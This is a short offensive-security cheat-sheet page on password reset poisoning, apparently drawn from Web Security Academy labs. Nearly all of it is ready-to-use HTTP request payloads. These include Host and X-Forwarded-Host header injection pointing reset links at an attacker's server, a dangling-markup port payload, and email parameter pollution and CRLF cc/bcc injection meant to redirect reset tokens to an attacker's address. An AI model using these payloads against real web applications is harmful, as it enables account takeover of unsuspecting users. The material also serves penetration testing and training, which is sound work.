---
title: "Password Reset Poisoning"
draft: false
images: []
menu:
  docs:
    parent: "Wapp"
weight: 100
toc: true
---

## Host Header
Modify the host header /forgot-password request to send the request to your own server exploit
```
POST /forgot-password HTTP/1.1
Host: ac2e1f241ee191188094086d00cc0041.web-security-academy.net

#########################################################################

POST /forgot-password HTTP/1.1
Host: exploitserver.com

#########################################################################

POST /forgot-password HTTP/1.1
Host: ac2e1f241ee191188094086d00cc0041.web-security-academy.net
Host: exploitserver.com
```
## X-Forwarded-Host
Notice that the X-Forwarded-Host header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain
```
POST /forgot-password HTTP/1.1
Host: ac1c1fcd1e67ea3480850d2c00150093.web-security-academy.net

##########################################################################

POST /forgot-password HTTP/1.1
Host: ac1c1fcd1e67ea3480850d2c00150093.web-security-academy.net
X-Forwarded-Host: exploitserver.com
```
### Add Non Numeric Port
```
POST /forgot-password HTTP/1.1
Host: acb31fb21f24d280806c1817008f0032.web-security-academy.net

###########################################################################

POST /forgot-password HTTP/1.1
Host: acb31fb21f24d280806c1817008f0032.web-security-academy.net:'<a href="https://exploitserver.net/?
```
## Manipulate Email Parameter
### Add attacker email as second parameter using &
```
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
### Add attacker email as second parameter using %20
```
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
### Add attacker email as second parameter using |
```
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
### Add attacker email as second parameter using cc
```
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
### Add attacker email as second parameter using bcc
```
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
### Add attacker email as second parameter using ,
```
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
### Add attacker email as second parameter in json array
```
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```